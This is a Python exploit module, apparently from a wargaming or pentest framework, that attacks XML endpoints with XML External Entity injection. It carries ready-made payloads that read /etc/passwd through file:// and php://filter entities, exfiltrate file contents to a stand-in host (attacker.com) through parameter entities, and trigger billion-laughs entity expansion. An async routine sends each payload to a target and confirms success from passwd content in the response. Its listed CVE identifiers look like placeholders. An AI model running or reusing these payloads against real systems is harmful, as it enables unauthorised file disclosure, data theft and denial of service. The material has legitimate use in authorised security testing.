"""
XXE Exploit (CWE-611) - XML External Entity injection attack.

Tests for XML parser vulnerabilities allowing external entity expansion.

Author: MAXIMUS Wargaming Team
Date: 2025-10-11
"""

import asyncio
import httpx
import time
from typing import Dict, Optional

from exploit_database import ExploitResult, ExploitStatus, ExploitCategory


# Exploit Metadata
EXPLOIT_ID = "cwe_611_xxe"
NAME = "XML External Entity (XXE) Injection"
DESCRIPTION = "Tests for XXE vulnerabilities in XML parsers"
CATEGORY = "xxe"
CWE_IDS = ["CWE-611"]
CVE_EXAMPLES = [
    "CVE-2024-XXE-001",
    "CVE-2023-XXE-456",
]


# XXE Payloads
XXE_PAYLOADS = {
    "file_read": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>""",
    
    "blind_oob": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>
  <data>test</data>
</root>""",
    
    "parameter_entity": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;
  %exfil;
]>
<root>
  <data>test</data>
</root>""",
    
    "billion_laughs": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>""",
    
    "php_wrapper": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>""",
}


async def execute(
    target_url: str,
    timeout: int = 30,
    **kwargs
) -> ExploitResult:
    """
    Execute XXE exploit.
    
    Args:
        target_url: Target XML endpoint (e.g., "http://localhost:8080/api/xml")
        timeout: Max execution time in seconds
        **kwargs: Additional parameters (headers, etc)
    
    Returns:
        ExploitResult with success=True if XXE vulnerability exists
    
    Strategy:
        1. Send XML with file:///etc/passwd entity
        2. Check response for /etc/passwd content
        3. Try out-of-band XXE (if OOB server available)
        4. Test entity expansion (Billion Laughs)
    
    Example:
        >>> result = await execute("http://vuln-app/api/xml")
    """
    start_time = time.time()
    output_lines = []
    
    try:
        headers = kwargs.get("headers", {})
        headers["Content-Type"] = "application/xml"
        
        output_lines.append(f"Testing XXE on: {target_url}")
        
        async with httpx.AsyncClient(timeout=timeout, follow_redirects=True) as client:
            # Test each payload
            for payload_name, payload_xml in XXE_PAYLOADS.items():
                output_lines.append(f"\n[Test] XXE Payload: {payload_name}")
                
                try:
                    response = await client.post(
                        target_url,
                        content=payload_xml,
                        headers=headers
                    )
                    
                    output_lines.append(f"Response status: {response.status_code}")
                    
                    # Success indicators
                    if response.status_code == 200:
                        response_text = response.text
                        
                        # Check for file content disclosure
                        file_read_indicators = [
                            "root:x:",           # /etc/passwd content
                            "daemon:",
                            "bin:",
                            "/bin/bash",
                            "/bin/sh",
                            "<?php",             # PHP wrapper success
                            "lollollol",         # Billion laughs expansion
                        ]
                        
                        if any(indicator in response_text for indicator in file_read_indicators):
                            output_lines.append("✓ XXE VULNERABILITY CONFIRMED!")
                            output_lines.append(f"✓ Payload type: {payload_name}")
                            output_lines.append(f"✓ Response contains: {response_text[:100]}...")
                            
                            duration = time.time() - start_time
                            
                            return ExploitResult(
                                exploit_id=EXPLOIT_ID,
                                category=ExploitCategory.XXE,
                                status=ExploitStatus.SUCCESS,
                                success=True,
                                output="\n".join(output_lines),
                                error=None,
                                duration_seconds=duration,
                                metadata={
                                    "payload_type": payload_name,
                                    "status_code": response.status_code,
                                    "response_preview": response_text[:200],
                                }
                            )
                        
                        # Check for error messages revealing parser behavior
                        error_indicators = [
                            "entity",
                            "external",
                            "dtd",
                            "xml",
                            "parse",
                        ]
                        
                        response_lower = response_text.lower()
                        if any(indicator in response_lower for indicator in error_indicators):
                            output_lines.append(f"? Parser error (potential XXE): {response_text[:100]}")
                    
                    elif response.status_code in [400, 500]:
                        output_lines.append(f"✗ Parser error: {response.status_code}")
                        
                        # Sometimes errors reveal XXE attempt
                        if "entity" in response.text.lower():
                            output_lines.append("? XXE attempt detected by parser")
                    
                    else:
                        output_lines.append(f"? Unexpected status: {response.status_code}")
                
                except httpx.HTTPError as e:
                    output_lines.append(f"HTTP error for {payload_name}: {e}")
                    continue
                
                except Exception as e:
                    output_lines.append(f"Error for {payload_name}: {e}")
                    continue
            
            # All payloads failed
            output_lines.append("\n✗ All XXE attempts blocked or ineffective")
            output_lines.append("✗ XML parser appears hardened against XXE")
            
            duration = time.time() - start_time
            
            return ExploitResult(
                exploit_id=EXPLOIT_ID,
                category=ExploitCategory.XXE,
                status=ExploitStatus.FAILED,
                success=False,
                output="\n".join(output_lines),
                error=None,
                duration_seconds=duration,
                metadata={"payloads_tested": len(XXE_PAYLOADS)}
            )
    
    except asyncio.TimeoutError:
        output_lines.append("✗ Exploit timeout")
        
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory.XXE,
            status=ExploitStatus.TIMEOUT,
            success=False,
            output="\n".join(output_lines),
            error=f"Timeout after {timeout}s",
            duration_seconds=timeout,
            metadata={}
        )
    
    except Exception as e:
        output_lines.append(f"✗ Exploit error: {e}")
        
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory.XXE,
            status=ExploitStatus.ERROR,
            success=False,
            output="\n".join(output_lines),
            error=str(e),
            duration_seconds=time.time() - start_time,
            metadata={}
        )


# Convenience function
async def test_xxe(target_url: str) -> bool:
    """
    Quick XXE vulnerability test.
    
    Returns:
        True if XXE vulnerability exists
    
    Example:
        >>> vulnerable = await test_xxe("http://localhost:8080/api/xml")
    """
    result = await execute(target_url)
    return result.success
